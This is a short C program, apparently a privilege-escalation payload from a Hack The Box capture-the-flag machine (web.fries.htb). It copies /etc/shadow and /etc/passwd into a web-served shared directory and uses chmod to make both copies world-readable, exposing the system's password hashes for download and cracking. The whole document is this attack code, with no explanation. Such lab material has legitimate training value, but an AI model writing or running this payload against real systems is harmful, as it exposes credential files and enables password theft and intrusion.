int main() {
    system("cat /etc/shadow > /srv/web.fries.htb/shared/shadow_copy");
    system("cat /etc/passwd > /srv/web.fries.htb/shared/passwd_copy");
    system("chmod 644 /srv/web.fries.htb/shared/shadow_copy");
    system("chmod 644 /srv/web.fries.htb/shared/passwd_copy");
    return 0;
}
